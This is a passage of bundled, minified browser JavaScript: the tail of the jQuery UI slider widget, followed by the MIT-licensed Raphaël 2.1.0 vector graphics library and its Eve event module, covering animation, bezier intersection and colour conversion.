t=this.options.values[e],t=this._trimAlignValue(t);if(this.options.values&&this.options.values.length){for(i=this.options.values.slice(),s=0;i.length>s;s+=1)i[s]=this._trimAlignValue(i[s]);return i}return[]},_trimAlignValue:function(e){if(this._valueMin()>=e)return this._valueMin();if(e>=this._valueMax())return this._valueMax();var t=this.options.step>0?this.options.step:1,i=(e-this._valueMin())%t,s=e-i;return 2*Math.abs(i)>=t&&(s+=i>0?t:-t),parseFloat(s.toFixed(5))},_valueMin:function(){return this.options.min},_valueMax:function(){return this.options.max},_refreshValue:function(){var t,i,s,a,n,r=this.options.range,o=this.options,h=this,l=this._animateOff?!1:o.animate,u={};this.options.values&&this.options.values.length?this.handles.each(function(s){i=100*((h.values(s)-h._valueMin())/(h._valueMax()-h._valueMin())),u["horizontal"===h.orientation?"left":"bottom"]=i+"%",e(this).stop(1,1)[l?"animate":"css"](u,o.animate),h.options.range===!0&&("horizontal"===h.orientation?(0===s&&h.range.stop(1,1)[l?"animate":"css"]({left:i+"%"},o.animate),1===s&&h.range[l?"animate":"css"]({width:i-t+"%"},{queue:!1,duration:o.animate})):(0===s&&h.range.stop(1,1)[l?"animate":"css"]({bottom:i+"%"},o.animate),1===s&&h.range[l?"animate":"css"]({height:i-t+"%"},{queue:!1,duration:o.animate}))),t=i}):(s=this.value(),a=this._valueMin(),n=this._valueMax(),i=n!==a?100*((s-a)/(n-a)):0,u["horizontal"===this.orientation?"left":"bottom"]=i+"%",this.handle.stop(1,1)[l?"animate":"css"](u,o.animate),"min"===r&&"horizontal"===this.orientation&&this.range.stop(1,1)[l?"animate":"css"]({width:i+"%"},o.animate),"max"===r&&"horizontal"===this.orientation&&this.range[l?"animate":"css"]({width:100-i+"%"},{queue:!1,duration:o.animate}),"min"===r&&"vertical"===this.orientation&&this.range.stop(1,1)[l?"animate":"css"]({height:i+"%"},o.animate),"max"===r&&"vertical"===this.orientation&&this.range[l?"animate":"css"]({height:100-i+"%"},{queue:!1,duration:o.animate}))},_handleEvents:{keydown:function(i){var s,a,n,r,o=e(i.target).data("ui-slider-handle-index");switch(i.keyCode){case e.ui.keyCode.HOME:case e.ui.keyCode.END:case e.ui.keyCode.PAGE_UP:case e.ui.keyCode.PAGE_DOWN:case e.ui.keyCode.UP:case e.ui.keyCode.RIGHT:case e.ui.keyCode.DOWN:case e.ui.keyCode.LEFT:if(i.preventDefault(),!this._keySliding&&(this._keySliding=!0,e(i.target).addClass("ui-state-active"),s=this._start(i,o),s===!1))return}switch(r=this.options.step,a=n=this.options.values&&this.options.values.length?this.values(o):this.value(),i.keyCode){case e.ui.keyCode.HOME:n=this._valueMin();break;case e.ui.keyCode.END:n=this._valueMax();break;case e.ui.keyCode.PAGE_UP:n=this._trimAlignValue(a+(this._valueMax()-this._valueMin())/t);break;case e.ui.keyCode.PAGE_DOWN:n=this._trimAlignValue(a-(this._valueMax()-this._valueMin())/t);break;case e.ui.keyCode.UP:case e.ui.keyCode.RIGHT:if(a===this._valueMax())return;n=this._trimAlignValue(a+r);break;case e.ui.keyCode.DOWN:case e.ui.keyCode.LEFT:if(a===this._valueMin())return;n=this._trimAlignValue(a-r)}this._slide(i,o,n)},click:function(e){e.preventDefault()},keyup:function(t){var i=e(t.target).data("ui-slider-handle-index");this._keySliding&&(this._keySliding=!1,this._stop(t,i),this._change(t,i),e(t.target).removeClass("ui-state-active"))}}})})(jQuery);







// ┌────────────────────────────────────────────────────────────────────┐ \\
// │ Raphaël 2.1.0 - JavaScript Vector Library                          │ \\
// ├────────────────────────────────────────────────────────────────────┤ \\
// │ Copyright © 2008-2012 Dmitry Baranovskiy (http://raphaeljs.com)    │ \\
// │ Copyright © 2008-2012 Sencha Labs (http://sencha.com)              │ \\
// ├────────────────────────────────────────────────────────────────────┤ \\
// │ Licensed under the MIT (http://raphaeljs.com/license.html) license.│ \\
// └────────────────────────────────────────────────────────────────────┘ \\

(function(a){var b="0.3.4",c="hasOwnProperty",d=/[\.\/]/,e="*",f=function(){},g=function(a,b){return a-b},h,i,j={n:{}},k=function(a,b){var c=j,d=i,e=Array.prototype.slice.call(arguments,2),f=k.listeners(a),l=0,m=!1,n,o=[],p={},q=[],r=h,s=[];h=a,i=0;for(var t=0,u=f.length;t<u;t++)"zIndex"in f[t]&&(o.push(f[t].zIndex),f[t].zIndex<0&&(p[f[t].zIndex]=f[t]));o.sort(g);while(o[l]<0){n=p[o[l++]],q.push(n.apply(b,e));if(i){i=d;return q}}for(t=0;t<u;t++){n=f[t];if("zIndex"in n)if(n.zIndex==o[l]){q.push(n.apply(b,e));if(i)break;do{l++,n=p[o[l]],n&&q.push(n.apply(b,e));if(i)break}while(n)}else p[n.zIndex]=n;else{q.push(n.apply(b,e));if(i)break}}i=d,h=r;return q.length?q:null};k.listeners=function(a){var b=a.split(d),c=j,f,g,h,i,k,l,m,n,o=[c],p=[];for(i=0,k=b.length;i<k;i++){n=[];for(l=0,m=o.length;l<m;l++){c=o[l].n,g=[c[b[i]],c[e]],h=2;while(h--)f=g[h],f&&(n.push(f),p=p.concat(f.f||[]))}o=n}return p},k.on=function(a,b){var c=a.split(d),e=j;for(var g=0,h=c.length;g<h;g++)e=e.n,!e[c[g]]&&(e[c[g]]={n:{}}),e=e[c[g]];e.f=e.f||[];for(g=0,h=e.f.length;g<h;g++)if(e.f[g]==b)return f;e.f.push(b);return function(a){+a==+a&&(b.zIndex=+a)}},k.stop=function(){i=1},k.nt=function(a){if(a)return(new RegExp("(?:\\.|\\/|^)"+a+"(?:\\.|\\/|$)")).test(h);return h},k.off=k.unbind=function(a,b){var f=a.split(d),g,h,i,k,l,m,n,o=[j];for(k=0,l=f.length;k<l;k++)for(m=0;m<o.length;m+=i.length-2){i=[m,1],g=o[m].n;if(f[k]!=e)g[f[k]]&&i.push(g[f[k]]);else for(h in g)g[c](h)&&i.push(g[h]);o.splice.apply(o,i)}for(k=0,l=o.length;k<l;k++){g=o[k];while(g.n){if(b){if(g.f){for(m=0,n=g.f.length;m<n;m++)if(g.f[m]==b){g.f.splice(m,1);break}!g.f.length&&delete g.f}for(h in g.n)if(g.n[c](h)&&g.n[h].f){var p=g.n[h].f;for(m=0,n=p.length;m<n;m++)if(p[m]==b){p.splice(m,1);break}!p.length&&delete g.n[h].f}}else{delete g.f;for(h in g.n)g.n[c](h)&&g.n[h].f&&delete g.n[h].f}g=g.n}}},k.once=function(a,b){var c=function(){var d=b.apply(this,arguments);k.unbind(a,c);return d};return k.on(a,c)},k.version=b,k.toString=function(){return"You are running Eve "+b},typeof module!="undefined"&&module.exports?module.exports=k:typeof define!="undefined"?define("eve",[],function(){return k}):a.eve=k})(this),function(){function cF(a){for(var b=0;b<cy.length;b++)cy[b].el.paper==a&&cy.splice(b--,1)}function cE(b,d,e,f,h,i){e=Q(e);var j,k,l,m=[],o,p,q,t=b.ms,u={},v={},w={};if(f)for(y=0,z=cy.length;y<z;y++){var x=cy[y];if(x.el.id==d.id&&x.anim==b){x.percent!=e?(cy.splice(y,1),l=1):k=x,d.attr(x.totalOrigin);break}}else f=+v;for(var y=0,z=b.percents.length;y<z;y++){if(b.percents[y]==e||b.percents[y]>f*b.top){e=b.percents[y],p=b.percents[y-1]||0,t=t/b.top*(e-p),o=b.percents[y+1],j=b.anim[e];break}f&&d.attr(b.anim[b.percents[y]])}if(!!j){if(!k){for(var A in j)if(j[g](A))if(U[g](A)||d.paper.customAttributes[g](A)){u[A]=d.attr(A),u[A]==null&&(u[A]=T[A]),v[A]=j[A];switch(U[A]){case C:w[A]=(v[A]-u[A])/t;break;case"colour":u[A]=a.getRGB(u[A]);var B=a.getRGB(v[A]);w[A]={r:(B.r-u[A].r)/t,g:(B.g-u[A].g)/t,b:(B.b-u[A].b)/t};break;case"path":var D=bR(u[A],v[A]),E=D[1];u[A]=D[0],w[A]=[];for(y=0,z=u[A].length;y<z;y++){w[A][y]=[0];for(var F=1,G=u[A][y].length;F<G;F++)w[A][y][F]=(E[y][F]-u[A][y][F])/t}break;case"transform":var H=d._,I=ca(H[A],v[A]);if(I){u[A]=I.from,v[A]=I.to,w[A]=[],w[A].real=!0;for(y=0,z=u[A].length;y<z;y++){w[A][y]=[u[A][y][0]];for(F=1,G=u[A][y].length;F<G;F++)w[A][y][F]=(v[A][y][F]-u[A][y][F])/t}}else{var J=d.matrix||new cb,K={_:{transform:H.transform},getBBox:function(){return d.getBBox(1)}};u[A]=[J.a,J.b,J.c,J.d,J.e,J.f],b$(K,v[A]),v[A]=K._.transform,w[A]=[(K.matrix.a-J.a)/t,(K.matrix.b-J.b)/t,(K.matrix.c-J.c)/t,(K.matrix.d-J.d)/t,(K.matrix.e-J.e)/t,(K.matrix.f-J.f)/t]}break;case"csv":var L=r(j[A])[s](c),M=r(u[A])[s](c);if(A=="clip-rect"){u[A]=M,w[A]=[],y=M.length;while(y--)w[A][y]=(L[y]-u[A][y])/t}v[A]=L;break;default:L=[][n](j[A]),M=[][n](u[A]),w[A]=[],y=d.paper.customAttributes[A].length;while(y--)w[A][y]=((L[y]||0)-(M[y]||0))/t}}var O=j.easing,P=a.easing_formulas[O];if(!P){P=r(O).match(N);if(P&&P.length==5){var R=P;P=function(a){return cC(a,+R[1],+R[2],+R[3],+R[4],t)}}else P=bf}q=j.start||b.start||+(new Date),x={anim:b,percent:e,timestamp:q,start:q+(b.del||0),status:0,initstatus:f||0,stop:!1,ms:t,easing:P,from:u,diff:w,to:v,el:d,callback:j.callback,prev:p,next:o,repeat:i||b.times,origin:d.attr(),totalOrigin:h},cy.push(x);if(f&&!k&&!l){x.stop=!0,x.start=new Date-t*f;if(cy.length==1)return cA()}l&&(x.start=new Date-x.ms*f),cy.length==1&&cz(cA)}else k.initstatus=f,k.start=new Date-k.ms*f;eve("raphael.anim.start."+d.id,d,b)}}function cD(a,b){var c=[],d={};this.ms=b,this.times=1;if(a){for(var e in a)a[g](e)&&(d[Q(e)]=a[e],c.push(Q(e)));c.sort(bd)}this.anim=d,this.top=c[c.length-1],this.percents=c}function cC(a,b,c,d,e,f){function o(a,b){var c,d,e,f,j,k;for(e=a,k=0;k<8;k++){f=m(e)-a;if(z(f)<b)return e;j=(3*i*e+2*h)*e+g;if(z(j)<1e-6)break;e=e-f/j}c=0,d=1,e=a;if(e<c)return c;if(e>d)return d;while(c<d){f=m(e);if(z(f-a)<b)return e;a>f?c=e:d=e,e=(d-c)/2+c}return e}function n(a,b){var c=o(a,b);return((l*c+k)*c+j)*c}function m(a){return((i*a+h)*a+g)*a}var g=3*b,h=3*(d-b)-g,i=1-g-h,j=3*c,k=3*(e-c)-j,l=1-j-k;return n(a,1/(200*f))}function cq(){return this.x+q+this.y+q+this.width+" × "+this.height}function cp(){return this.x+q+this.y}function cb(a,b,c,d,e,f){a!=null?(this.a=+a,this.b=+b,this.c=+c,this.d=+d,this.e=+e,this.f=+f):(this.a=1,this.b=0,this.c=0,this.d=1,this.e=0,this.f=0)}function bH(b,c,d){b=a._path2curve(b),c=a._path2curve(c);var e,f,g,h,i,j,k,l,m,n,o=d?0:[];for(var p=0,q=b.length;p<q;p++){var r=b[p];if(r[0]=="M")e=i=r[1],f=j=r[2];else{r[0]=="C"?(m=[e,f].concat(r.slice(1)),e=m[6],f=m[7]):(m=[e,f,e,f,i,j,i,j],e=i,f=j);for(var s=0,t=c.length;s<t;s++){var u=c[s];if(u[0]=="M")g=k=u[1],h=l=u[2];else{u[0]=="C"?(n=[g,h].concat(u.slice(1)),g=n[6],h=n[7]):(n=[g,h,g,h,k,l,k,l],g=k,h=l);var v=bG(m,n,d);if(d)o+=v;else{for(var w=0,x=v.length;w<x;w++)v[w].segment1=p,v[w].segment2=s,v[w].bez1=m,v[w].bez2=n;o=o.concat(v)}}}}}return o}function bG(b,c,d){var e=a.bezierBBox(b),f=a.bezierBBox(c);if(!a.isBBoxIntersect(e,f))return d?0:[];var g=bB.apply(0,b),h=bB.apply(0,c),i=~~(g/5),j=~~(h/5),k=[],l=[],m={},n=d?0:[];for(var o=0;o<i+1;o++){var p=a.findDotsAtSegment.apply(a,b.concat(o/i));k.push({x:p.x,y:p.y,t:o/i})}for(o=0;o<j+1;o++)p=a.findDotsAtSegment.apply(a,c.concat(o/j)),l.push({x:p.x,y:p.y,t:o/j});for(o=0;o<i;o++)for(var q=0;q<j;q++){var r=k[o],s=k[o+1],t=l[q],u=l[q+1],v=z(s.x-r.x)<.001?"y":"x",w=z(u.x-t.x)<.001?"y":"x",x=bD(r.x,r.y,s.x,s.y,t.x,t.y,u.x,u.y);if(x){if(m[x.x.toFixed(4)]==x.y.toFixed(4))continue;m[x.x.toFixed(4)]=x.y.toFixed(4);var y=r.t+z((x[v]-r[v])/(s[v]-r[v]))*(s.t-r.t),A=t.t+z((x[w]-t[w])/(u[w]-t[w]))*(u.t-t.t);y>=0&&y<=1&&A>=0&&A<=1&&(d?n++:n.push({x:x.x,y:x.y,t1:y,t2:A}))}}return n}function bF(a,b){return bG(a,b,1)}function bE(a,b){return bG(a,b)}function bD(a,b,c,d,e,f,g,h){if(!(x(a,c)<y(e,g)||y(a,c)>x(e,g)||x(b,d)<y(f,h)||y(b,d)>x(f,h))){var i=(a*d-b*c)*(e-g)-(a-c)*(e*h-f*g),j=(a*d-b*c)*(f-h)-(b-d)*(e*h-f*g),k=(a-c)*(f-h)-(b-d)*(e-g);if(!k)return;var l=i/k,m=j/k,n=+l.toFixed(2),o=+m.toFixed(2);if(n<+y(a,c).toFixed(2)||n>+x(a,c).toFixed(2)||n<+y(e,g).toFixed(2)||n>+x(e,g).toFixed(2)||o<+y(b,d).toFixed(2)||o>+x(b,d).toFixed(2)||o<+y(f,h).toFixed(2)||o>+x(f,h).toFixed(2))return;return{x:l,y:m}}}function bC(a,b,c,d,e,f,g,h,i){if(!(i<0||bB(a,b,c,d,e,f,g,h)<i)){var j=1,k=j/2,l=j-k,m,n=.01;m=bB(a,b,c,d,e,f,g,h,l);while(z(m-i)>n)k/=2,l+=(m<i?1:-1)*k,m=bB(a,b,c,d,e,f,g,h,l);return l}}function bB(a,b,c,d,e,f,g,h,i){i==null&&(i=1),i=i>1?1:i<0?0:i;var j=i/2,k=12,l=[-0.1252,.1252,-0.3678,.3678,-0.5873,.5873,-0.7699,.7699,-0.9041,.9041,-0.9816,.9816],m=[.2491,.2491,.2335,.2335,.2032,.2032,.1601,.1601,.1069,.1069,.0472,.0472],n=0;for(var o=0;o<k;o++){var p=j*l[o]+j,q=bA(p,a,c,e,g),r=bA(p,b,d,f,h),s=q*q+r*r;n+=m[o]*w.sqrt(s)}return j*n}function bA(a,b,c,d,e){var f=-3*b+9*c-9*d+3*e,g=a*f+6*b-12*c+6*d;return a*g-3*b+3*c}function by(a,b){var c=[];for(var d=0,e=a.length;e-2*!b>d;d+=2){var f=[{x:+a[d-2],y:+a[d-1]},{x:+a[d],y:+a[d+1]},{x:+a[d+2],y:+a[d+3]},{x:+a[d+4],y:+a[d+5]}];b?d?e-4==d?f[3]={x:+a[0],y:+a[1]}:e-2==d&&(f[2]={x:+a[0],y:+a[1]},f[3]={x:+a[2],y:+a[3]}):f[0]={x:+a[e-2],y:+a[e-1]}:e-4==d?f[3]=f[2]:d||(f[0]={x:+a[d],y:+a[d+1]}),c.push(["C",(-f[0].x+6*f[1].x+f[2].x)/6,(-f[0].y+6*f[1].y+f[2].y)/6,(f[1].x+6*f[2].x-f[3].x)/6,(f[1].y+6*f[2].y-f[3].y)/6,f[2].x,f[2].y])}return c}function bx(){return this.hex}function bv(a,b,c){function d(){var e=Array.prototype.slice.call(arguments,0),f=e.join("␀"),h=d.cache=d.cache||{},i=d.count=d.count||[];if(h[g](f)){bu(i,f);return c?c(h[f]):h[f]}i.length>=1e3&&delete h[i.shift()],i.push(f),h[f]=a[m](b,e);return c?c(h[f]):h[f]}return d}function bu(a,b){for(var c=0,d=a.length;c<d;c++)if(a[c]===b)return a.push(a.splice(c,1)[0])}function bm(a){if(Object(a)!==a)return a;var b=new a.constructor;for(var c in a)a[g](c)&&(b[c]=bm(a[c]));return b}function a(c){if(a.is(c,"function"))return b?c():eve.on("raphael.DOMload",c);if(a.is(c,E))return a._engine.create[m](a,c.splice(0,3+a.is(c[0],C))).add(c);var d=Array.prototype.slice.call(arguments,0);if(a.is(d[d.length-1],"function")){var e=d.pop();return b?e.call(a._engine.create[m](a,d)):eve.on("raphael.DOMload",function(){e.call(a._engine.create[m](a,d))})}return a._engine.create[m](a,arguments)}a.version="2.1.0",a.eve=eve;var b,c=/[, ]+/,d={circle:1,rect:1,path:1,ellipse:1,text:1,image:1},e=/\{(\d+)\}/g,f="prototype",g="hasOwnProperty",h={doc:document,win:window},i={was:Object.prototype[g].call(h.win,"Raphael"),is:h.win.Raphael},j=function(){this.ca=this.customAttributes={}},k,l="appendChild",m="apply",n="concat",o="createTouch"in h.doc,p="",q=" ",r=String,s="split",t="click dblclick mousedown mousemove mouseout mouseover mouseup touchstart touchmove touchend touchcancel"[s](q),u={mousedown:"touchstart",mousemove:"touchmove",mouseup:"touchend"},v=r.prototype.toLowerCase,w=Math,x=w.max,y=w.min,z=w.abs,A=w.pow,B=w.PI,C="number",D="string",E="array",F="toString",G="fill",H=Object.prototype.toString,I={},J="push",K=a._ISURL=/^url\(['"]?([^\)]+?)['"]?\)$/i,L=/^\s*((#[a-f\d]{6})|(#[a-f\d]{3})|rgba?\(\s*([\d\.]+%?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+%?(?:\s*,\s*[\d\.]+%?)?)\s*\)|hsba?\(\s*([\d\.]+(?:deg|\xb0|%)?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+(?:%?\s*,\s*[\d\.]+)?)%?\s*\)|hsla?\(\s*([\d\.]+(?:deg|\xb0|%)?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+(?:%?\s*,\s*[\d\.]+)?)%?\s*\))\s*$/i,M={NaN:1,Infinity:1,"-Infinity":1},N=/^(?:cubic-)?bezier\(([^,]+),([^,]+),([^,]+),([^\)]+)\)/,O=w.round,P="setAttribute",Q=parseFloat,R=parseInt,S=r.prototype.toUpperCase,T=a._availableAttrs={"arrow-end":"none","arrow-start":"none",blur:0,"clip-rect":"0 0 1e9 1e9",cursor:"default",cx:0,cy:0,fill:"#fff","fill-opacity":1,font:'10px "Arial"',"font-family":'"Arial"',"font-size":"10","font-style":"normal","font-weight":400,gradient:0,height:0,href:"http://raphaeljs.com/","letter-spacing":0,opacity:1,path:"M0,0",r:0,rx:0,ry:0,src:"",stroke:"#000","stroke-dasharray":"","stroke-linecap":"butt","stroke-linejoin":"butt","stroke-miterlimit":0,"stroke-opacity":1,"stroke-width":1,target:"_blank","text-anchor":"middle",title:"Raphael",transform:"",width:0,x:0,y:0},U=a._availableAnimAttrs={blur:C,"clip-rect":"csv",cx:C,cy:C,fill:"colour","fill-opacity":C,"font-size":C,height:C,opacity:C,path:"path",r:C,rx:C,ry:C,stroke:"colour","stroke-opacity":C,"stroke-width":C,transform:"transform",width:C,x:C,y:C},V=/[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]/g,W=/[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*,[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*/,X={hs:1,rg:1},Y=/,?([achlmqrstvxz]),?/gi,Z=/([achlmrqstvz])[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029,]*((-?\d*\.?\d*(?:e[\-+]?\d+)?[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*,?[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*)+)/ig,$=/([rstm])[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029,]*((-?\d*\.?\d*(?:e[\-+]?\d+)?[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*,?[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*)+)/ig,_=/(-?\d*\.?\d*(?:e[\-+]?\d+)?)[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*,?[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*/ig,ba=a._radial_gradient=/^r(?:\(([^,]+?)[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*,[\x09\x0a\x0b\x0c\x0d\x20\xa0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029]*([^\)]+?)\))?/,bb={},bc=function(a,b){return a.key-b.key},bd=function(a,b){return Q(a)-Q(b)},be=function(){},bf=function(a){return a},bg=a._rectPath=function(a,b,c,d,e){if(e)return[["M",a+e,b],["l",c-e*2,0],["a",e,e,0,0,1,e,e],["l",0,d-e*2],["a",e,e,0,0,1,-e,e],["l",e*2-c,0],["a",e,e,0,0,1,-e,-e],["l",0,e*2-d],["a",e,e,0,0,1,e,-e],["z"]];return[["M",a,b],["l",c,0],["l",0,d],["l",-c,0],["z"]]},bh=function(a,b,c,d){d==null&&(d=c);return[["M",a,b],["m",0,-d],["a",c,d,0,1,1,0,2*d],["a",c,d,0,1,1,0,-2*d],["z"]]},bi=a._getPath={path:function(a){return a.attr("path")},circle:function(a){var b=a.attrs;return bh(b.cx,b.cy,b.r)},ellipse:function(a){var b=a.attrs;return bh(b.cx,b.cy,b.rx,b.ry)},rect:function(a){var b=a.attrs;return bg(b.x,b.y,b.width,b.height,b.r)},image:function(a){var b=a.attrs;return bg(b.x,b.y,b.width,b.height)},text:function(a){var b=a._getBBox();return bg(b.x,b.y,b.width,b.height)}},bj=a.mapPath=function(a,b){if(!b)return a;var c,d,e,f,g,h,i;a=bR(a);for(e=0,g=a.length;e<g;e++){i=a[e];for(f=1,h=i.length;f<h;f+=2)c=b.x(i[f],i[f+1]),d=b.y(i[f],i[f+1]),i[f]=c,i[f+1]=d}return a};a._g=h,a.type=h.win.SVGAngle||h.doc.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#BasicStructure","1.1")?"SVG":"VML";if(a.type=="VML"){var bk=h.doc.createElement("div"),bl;bk.innerHTML='<v:shape adj="1"/>',bl=bk.firstChild,bl.style.behavior="url(#default#VML)";if(!bl||typeof bl.adj!="object")return a.type=p;bk=null}a.svg=!(a.vml=a.type=="VML"),a._Paper=j,a.fn=k=j.prototype=a.prototype,a._id=0,a._oid=0,a.is=function(a,b){b=v.call(b);if(b=="finite")return!M[g](+a);if(b=="array")return a instanceof Array;return b=="null"&&a===null||b==typeof a&&a!==null||b=="object"&&a===Object(a)||b=="array"&&Array.isArray&&Array.isArray(a)||H.call(a).slice(8,-1).toLowerCase()==b},a.angle=function(b,c,d,e,f,g){if(f==null){var h=b-d,i=c-e;if(!h&&!i)return 0;return(180+w.atan2(-i,-h)*180/B+360)%360}return a.angle(b,c,f,g)-a.angle(d,e,f,g)},a.rad=function(a){return a%360*B/180},a.deg=function(a){return a*180/B%360},a.snapTo=function(b,c,d){d=a.is(d,"finite")?d:10;if(a.is(b,E)){var e=b.length;while(e--)if(z(b[e]-c)<=d)return b[e]}else{b=+b;var f=c%b;if(f<d)return c-f;if(f>b-d)return c-f+b}return c};var bn=a.createUUID=function(a,b){return function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(a,b).toUpperCase()}}(/[xy]/g,function(a){var b=w.random()*16|0,c=a=="x"?b:b&3|8;return c.toString(16)});a.setWindow=function(b){eve("raphael.setWindow",a,h.win,b),h.win=b,h.doc=h.win.document,a._engine.initWin&&a._engine.initWin(h.win)};var bo=function(b){if(a.vml){var c=/^\s+|\s+$/g,d;try{var e=new ActiveXObject("htmlfile");e.write("<body>"),e.close(),d=e.body}catch(f){d=createPopup().document.body}var g=d.createTextRange();bo=bv(function(a){try{d.style.color=r(a).replace(c,p);var b=g.queryCommandValue("ForeColor");b=(b&255)<<16|b&65280|(b&16711680)>>>16;return"#"+("000000"+b.toString(16)).slice(-6)}catch(e){return"none"}})}else{var i=h.doc.createElement("i");i.title="Raphaël Colour Picker",i.style.display="none",h.doc.body.appendChild(i),bo=bv(function(a){i.style.color=a;return h.doc.defaultView.getComputedStyle(i,p).getPropertyValue("color")})}return bo(b)},bp=function(){return"hsb("+[this.h,this.s,this.b]+")"},bq=function(){return"hsl("+[this.h,this.s,this.l]+")"},br=function(){return this.hex},bs=function(b,c,d){c==null&&a.is(b,"object")&&"r"in b&&"g"in b&&"b"in b&&(d=b.b,c=b.g,b=b.r);if(c==null&&a.is(b,D)){var e=a.getRGB(b);b=e.r,c=e.g,d=e.b}if(b>1||c>1||d>1)b/=255,c/=255,d/=255;return[b,c,d]},bt=function(b,c,d,e){b*=255,c*=255,d*=255;var f={r:b,g:c,b:d,hex:a.rgb(b,c,d),toString:br};a.is(e,"finite")&&(f.opacity=e);return f};a.color=function(b){var c;a.is(b,"object")&&"h"in b&&"s"in b&&"b"in b?(c=a.hsb2rgb(b),b.r=c.r,b.g=c.g,b.b=c.b,b.hex=c.hex):a.is(b,"object")&&"h"in b&&"s"in b&&"l"in b?(c=a.hsl2rgb(b),b.r=c.r,b.g=c.g,b.b=c.b,b.hex=c.hex):(a.is(b,"string")&&(b=a.getRGB(b)),a.is(b,"object")&&"r"in b&&"g"in b&&"b"in b?(c=a.rgb2hsl(b),b.h=c.h,b.s=c.s,b.l=c.l,c=a.rgb2hsb(b),b.v=c.b):(b={hex:"none"},b.r=b.g=b.b=b.h=b.s=b.v=b.l=-1)),b.toString=br;return b},a.hsb2rgb=function(a,b,c,d){this.is(a,"object")&&"h"in a&&"s"in a&&"b"in a&&(c=a.b,b=a.s,a=a.h,d=a.o),a*=360;var e,f,g,h,i;a=a%360/60,i=c*b,h=i*(1-z(a%2-1)),e=f=g=c-i,a=~~a,e+=[i,h,0,0,h,i][a],f+=[h,i,i,h,0,0][a],g+=[0,0,h,i,i,h][a];return bt(e,f,g,d)},a.hsl2rgb=function(a,b,c,d){this.is(a,"object")&&"h"in a&&"s"in a&&"l"in a&&(c=a.l,b=a.s,a=a.h);if(a>1||b>1||c>1)a/=360,b/=100,c/=100;a*=360;var e,f,g,h,i;a=a%360/60,i=2*b*(c<.5?c:1-c),h=i*(1-z(a%2-1)),e=f=g=c-i/2,a=~~a,e+=[i,h,0,0,h,i][a],f+=[h,i,i,h,0,0][a],g+=[0,0,h,i,i,h][a];return bt(e,f,g,d)},a.rgb2hsb=function(a,b,c){c=bs(a,b,c),a=c[0],b=c[1],c=c[2];var d,e,f,g;f=x(a,b,c),g=f-y(a,b,c),d=g==0?null:f==a?(b-c)/g:f==b?(c-a)/g+2:(a-b)/g+4,d=(d+360)%6*60/360,e=g==0?0:g/f;return{h:d,s:e,b:f,toString:bp}},a.rgb2hsl=function(a,b,c){c=bs(a,b,c),a=c[0],b=c[1],c=c[2];var d,e,f,g,h,i;g=x(a,b,c),h=y(a,b,c),i=g-h,d=i==0?null:g==a?(b-c)/i:g==b?(c-a)/i+2:(a-b)/i+4,d=(d+360)%6*60/360,f=(g+h)/2,e=i==0?0:f<.5?i/(2*f):i/(2-2*f);return{h:d,s:e,l:f,toString:bq}},a._path2string=function(){return this.join(",").replace(Y,"$1")};var bw=a._preload=function(a,b){var c=h.doc.createElement("img");c.style.cssText="position:absolute;left:-9999em;top:-9999em",c.onload=function(){b.call(this),this.onload=null,h.doc.body.removeChild(this)},c.onerror=function(){h.doc.body.removeChild(this)},h.doc.body.appendChild(c),c.src=a};a.getRGB=bv(function(b){if(!b||!!((b=r(b)).indexOf("-")+1))return{r:-1,g:-1,b:-1,hex:"none",error:1,toString:bx};if(b=="none")return{r:-1,g:-1,b:-1,hex:"none",toString:bx};!X[g](b.toLowerCase().substring(0,2))&&b.charAt()!="#"&&(b=bo(b));var 